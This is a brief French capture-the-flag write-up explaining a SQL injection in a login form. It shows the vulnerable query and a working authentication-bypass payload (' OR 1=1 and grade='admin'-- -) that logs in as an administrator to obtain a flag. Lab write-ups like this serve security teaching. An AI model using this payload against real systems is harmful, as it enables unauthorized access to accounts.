# SQLi

Le seul champ injectable est le champs "login". Une injection SQL est présente !

```sql
SELECT uid FROM users WHERE username='{rq_username}' and password='{rq_passwd}';
```

Ainsi si on entre le nom d'utilisateur `jean` et le mot de passe `jeanjean2010`, on obtient la requête SQL suivante :
```sql
SELECT uid FROM users WHERE username='jean' and password='jeanjean2010';
```

Ainsi en insérant `' OR 1=1 and grade='admin'-- -` dans le champs username, on obtient :

```sql
SELECT uid FROM users WHERE username='' OR 1=1 and grade='admin'-- -' and password='jeanjean2010';
```

Cette requête va retourner les utilisateurs administateurs, on est donc connecté avec l'utilisateur Erich Ludendorff qui est administrateur, et on peut accéder à la war-page donnant le 2ème flag !
